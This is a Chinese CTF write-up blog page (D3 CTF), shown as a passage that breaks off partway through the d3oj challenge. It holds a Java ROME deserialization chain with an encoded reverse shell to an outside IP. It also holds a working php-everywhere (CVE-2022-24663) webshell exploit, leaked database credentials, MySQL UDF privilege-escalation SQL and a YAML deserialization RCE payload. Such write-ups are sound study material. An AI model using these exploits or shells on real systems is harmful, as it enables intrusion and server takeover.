@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2023/12/25/d3ctf/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/d3ctf/","path":"2023/12/25/d3ctf/","title":"D3 CTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>D3 CTF | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shorter"><span class="nav-text">shorter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NewestWordPress"><span class="nav-text">NewestWordPress</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#d3oj"><span class="nav-text">d3oj</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-text">非预期解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#YAML-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-WS-2019-0063"><span class="nav-text">YAML 反序列化漏洞 WS-2019-0063</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95"><span class="nav-text">任意登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-8158"><span class="nav-text">CVE-2020-8158</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezsql"><span class="nav-text">ezsql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#d3fGo"><span class="nav-text">d3fGo</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/d3ctf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="D3 CTF | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          D3 CTF
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E8%B5%9B%E9%A2%98wp/" itemprop="url" rel="index"><span itemprop="name">赛题wp</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/4755f794d50b55e359f52f23603d7207.png" alt="image-20220323195235536"></p>
+<a id="more"></a>
+
+<h1 id="shorter"><a href="#shorter" class="headerlink" title="shorter"></a>shorter</h1><ul>
+<li>ROME 链</li>
+<li>java 反序列化缩小</li>
+</ul>
+<p>附件给了一个jar包，反编译后发现反序列化点，但是有长度限制1956</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/62a0740b1fb547f2eebbc19cf95af830.png" alt="image-20220308194019489"></p>
+<p>看一下lib库，发现了rome-1.0，这个依赖存在反序列化点</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/c9d04b7ddb6d93f6a672852df4d090da.png" alt="image-20220308194134089"></p>
+<p>所以思路就是通过缩小后的 rome 链子打过去，说到缩小payload的技术，许少的文章和工具：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10824">终极Java反序列化Payload缩小技术 - 先知社区 (aliyun.com)</a></p>
+<p>rome链：<a target="_blank" rel="noopener" href="https://www.yuque.com/jinjinshigekeaigui/qskpi5/cz1um4#asSav">Java安全之ROME反序列化利用分析 · 语雀 (yuque.com)</a> 、<a target="_blank" rel="noopener" href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">ROME反序列化分析 (c014.cn)</a></p>
+<p>先手动尝试构造</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.sec.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> javassist.CtNewConstructor;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ROME</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj,String fieldname,Object value)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getShortTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            CtClass ctClass = pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            CtClass superClass = pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            CtConstructor constructor = CtNewConstructor.make(<span class="string">&quot;    public Evil()&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        try &#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;        &#125;catch (Exception ignored)&#123;&#125;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    &#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//TemplateImpl 动态加载字节码</span></span><br><span class="line">        <span class="comment">//byte[] code = ClassPool.getDefault().get(&quot;com.bytecode.exp&quot;).toBytecode();</span></span><br><span class="line">        <span class="keyword">byte</span>[] code = getShortTemplatesImpl(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4xMTAuNjEvMzAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jiang&quot;</span>);</span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">        setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;code&#125;);</span><br><span class="line"></span><br><span class="line">        EqualsBean bean = <span class="keyword">new</span> EqualsBean(String.class,<span class="string">&quot;jiang&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap map1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        HashMap map2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,obj);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,obj);</span><br><span class="line">        Hashtable table = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        table.put(map1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        table.put(map2,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_beanClass&quot;</span>,Templates.class);</span><br><span class="line">        setFieldValue(bean,<span class="string">&quot;_obj&quot;</span>,obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(table);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bais);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line"><span class="comment">//        ois.close();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/f51cd7b57c8a268ae81e7ed2bb50f036.png" alt="image-20220309082242447"></p>
+<p>尝试将rome链子直接放到工具里面，自动生成</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.sec.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ROME</span> <span class="keyword">extends</span> <span class="title">Payload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getPayloadUseCommand(String cmd) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Generator.getTemplateImplBytes(cmd);</span><br><span class="line">        <span class="keyword">return</span> getPayloadUseByteCodes(code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] getPayloadUseByteCodes(<span class="keyword">byte</span>[] byteCodes)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">            setFieldValue(obj,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;jiang&quot;</span>);</span><br><span class="line">            setFieldValue(obj,<span class="string">&quot;_class&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span></span><br><span class="line">            setFieldValue(obj,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;byteCodes&#125;);</span><br><span class="line"></span><br><span class="line">            EqualsBean bean = <span class="keyword">new</span> EqualsBean(String.class,<span class="string">&quot;jiang&quot;</span>);</span><br><span class="line"></span><br><span class="line">            HashMap map1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">            HashMap map2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">            map1.put(<span class="string">&quot;yy&quot;</span>,bean);</span><br><span class="line">            map1.put(<span class="string">&quot;zZ&quot;</span>,obj);</span><br><span class="line">            map2.put(<span class="string">&quot;zZ&quot;</span>,bean);</span><br><span class="line">            map2.put(<span class="string">&quot;yy&quot;</span>,obj);</span><br><span class="line">            Hashtable table = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            table.put(map1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">            table.put(map2,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">            setFieldValue(bean,<span class="string">&quot;_beanClass&quot;</span>,Templates.class);</span><br><span class="line">            setFieldValue(bean,<span class="string">&quot;_obj&quot;</span>,obj);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//序列化</span></span><br><span class="line">            <span class="keyword">return</span> serialize(table);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>maven打包生成jar包</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjExNi4xMTAuNjEvMzAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/285bd8f4c688389b2fd1281586fc04f1.png" alt="image-20220309000546116"></p>
+<p>传paylaod时，url加密一下，还有Y4的 <a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/">ROME改造计划 | Y4tacker’s Blog</a></p>
+<h1 id="NewestWordPress"><a href="#NewestWordPress" class="headerlink" title="NewestWordPress"></a>NewestWordPress</h1><ul>
+<li>wordpress</li>
+<li>php_everywhere</li>
+<li>mysql udf提权</li>
+</ul>
+<p>描述</p>
+<p>The newest WordPress version! Oh… 5.9.1 is the newest…<br>P.S. Challenge environment reset every 10min.</p>
+<p>Hint:<br>WordPress 和 UsersWP 都是最新版本<br>问题不在 WordPress 和 UsersWP 上<br>而在一个 WPScan 没有识别出的插件上</p>
+<p>找到最近出漏洞的插件 <strong>php_everywhere</strong> <a target="_blank" rel="noopener" href="https://threatpost.com/php-everywhere-bugs-wordpress-rce/178338/">https://threatpost.com/php-everywhere-bugs-wordpress-rce/178338/</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d3wordpress.d3ctf-challenge.n3ko.co&#x2F;wp-content&#x2F;plugins&#x2F;php-everywhere&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>插件 php-everywhere 最新的洞 <strong>CVE-2022-24663</strong> 可以任意代码执行</p>
+<p><a target="_blank" rel="noopener" href="https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/">https://www.wordfence.com/blog/2022/02/critical-vulnerabilities-in-php-everywhere-allow-remote-code-execution/</a></p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># getshell.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># base_url = &quot;http://d3wordpress.d3ctf-challenge.n3ko.co&quot;</span></span><br><span class="line">base_url = <span class="string">&quot;http://global-wordpress-d3ctf-challenge.n3ko.co&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getShell</span>():</span></span><br><span class="line">	sess = requests.session()</span><br><span class="line">	login_url = base_url + <span class="string">&quot;/wp-login.php&quot;</span></span><br><span class="line">	login_data = &#123;</span><br><span class="line">		<span class="string">&quot;log&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">		<span class="string">&quot;pwd&quot;</span>: <span class="string">&quot;testtest&quot;</span>,</span><br><span class="line">		<span class="string">&quot;wp-submit&quot;</span>: <span class="string">&quot;Log In&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	res = sess.post(login_url, data=login_data)</span><br><span class="line">	<span class="comment"># print(res.text)</span></span><br><span class="line"></span><br><span class="line">	getShell_url = base_url + <span class="string">&quot;/wp-admin/admin-ajax.php&quot;</span></span><br><span class="line">	encoded_payload =	<span class="string">&#x27;W3BocF9ldmVyeXdoZXJlXTw/cGhwCnByaW50KF9fRElSX18pOwokYj0nUEQ5d2FIQUtaWFpoYkNna1gxQlBVMVJiSjJ</span></span><br><span class="line"><span class="string">GdWRDZGRLVHNLUHo0PSc7CmZpbGVfcHV0X2NvbnRlbnRzKF9fRElSX18uJy8uLi8uLi91cGxvYWRzLzIwMjIvMDMvMS5</span></span><br><span class="line"><span class="string">waHAnLGJhc2U2NF9kZWNvZGUoJGIpKTsKPz5bL3BocF9ldmVyeXdoZXJlXQo=&#x27;</span></span><br><span class="line"></span><br><span class="line">	getShell_data = &#123;</span><br><span class="line">		<span class="string">&quot;action&quot;</span>: <span class="string">&quot;parse-media-shortcode&quot;</span>,</span><br><span class="line">		<span class="string">&quot;shortcode&quot;</span>: base64.b64decode(encoded_payload),</span><br><span class="line">	&#125;</span><br><span class="line">	sess.post(getShell_url, data=getShell_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	getShell()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[php_everywhere]&lt;?php print(__DIR__);$b&#x3D;&#39;PD9waHAKZXZhbCgkX1BPU1RbJ2FudCddKTsKPz4&#x3D;&#39;;file_put_contents(__DIR__.&#39;&#x2F;..&#x2F;..&#x2F;uploads&#x2F;2022&#x2F;03&#x2F;1.php&#39;,base64_decode($b));?&gt;[&#x2F;php_everywhere]</span><br></pre></td></tr></table></figure>
+
+<p>getshell之后翻找 wp-config.php 文件来得到 MySQL 的相关配置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; ** Database settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class="line">&#x2F;** Database username *&#x2F;</span><br><span class="line">define( &#39;DB_USER&#39;, &#39;root&#39; );</span><br><span class="line">&#x2F;** Database password *&#x2F;</span><br><span class="line">define( &#39;DB_PASSWORD&#39;, &#39;9Z98g4nmbJxrF5aYHvGaatyi354WxYyp&#39; );</span><br><span class="line">&#x2F;** Database hostname *&#x2F;</span><br><span class="line">define( &#39;DB_HOST&#39;, &#39;127.0.0.1:3306&#39; );</span><br><span class="line">&#x2F;** Database charset to use in creating database tables. *&#x2F;</span><br><span class="line">define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );</span><br><span class="line">&#x2F;** The database collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure>
+
+<p>可以发现是使用高权限账户来链接数据库的 打一个 udf 提权就可以拿到 shell，flag 在根目录下</p>
+<p>然后写一个跳板操作数据库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; mysql.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$mysqli &#x3D; new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;9Z98g4nmbJxrF5aYHvGaatyi354WxYyp&quot;,&quot;wordpress&quot;);</span><br><span class="line">$tmp &#x3D; $mysqli-&gt;query($_POST[&#39;sql&#39;]);</span><br><span class="line">$result &#x3D; $tmp-&gt;fetch_all();</span><br><span class="line">var_dump($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>打MYSQL udf ，sqlmap中或者msf中自带就行</p>
+<blockquote>
+<p>show variables like ‘%plugin%’; 查看插件库路径</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT 0x7f454c...... INTO DUMPFILE &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br><span class="line"></span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</span><br><span class="line"></span><br><span class="line">SELECT sys_eval(&#39;ls &#x2F;&#39;);</span><br><span class="line"></span><br><span class="line">SELECT sys_eval(&#39;cat &#x2F;ff114499_i5_h3Re&#39;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="d3oj"><a href="#d3oj" class="headerlink" title="d3oj"></a>d3oj</h1><p>找到源码：<a target="_blank" rel="noopener" href="https://github.com/syzoj/syzoj">syzoj/syzoj: 一个用于算法竞赛的在线评测系统。An online judge system for algorithm competition. (github.com)</a></p>
+<h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><h3 id="YAML-反序列化漏洞-WS-2019-0063"><a href="#YAML-反序列化漏洞-WS-2019-0063" class="headerlink" title="YAML 反序列化漏洞 WS-2019-0063"></a>YAML 反序列化漏洞 WS-2019-0063</h3><p>上传下面的数据(data.yml)到创建的题目可以造成rce</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123; toString: !&lt;tag:yaml.org,2002:js&#x2F;function&gt; &#39;function ()&#123;app.use(&quot;&#x2F;rce&quot;,</span><br><span class="line">(q,r)&#x3D;&gt;r.send(eval(q.body.c)));&#125;&#39; &#125; : 1</span><br></pre></td></tr></table></figure>
+
+<h2 id="任意登录"><a href="#任意登录" class="headerlink" title="任意登录"></a>任意登录</h2><p><a target="_blank" rel="noopener" href="https://github.com/syzoj/syzoj/blob/master/app.js#L276">https://github.com/syzoj/syzoj/blob/master/app.js#L276</a></p>
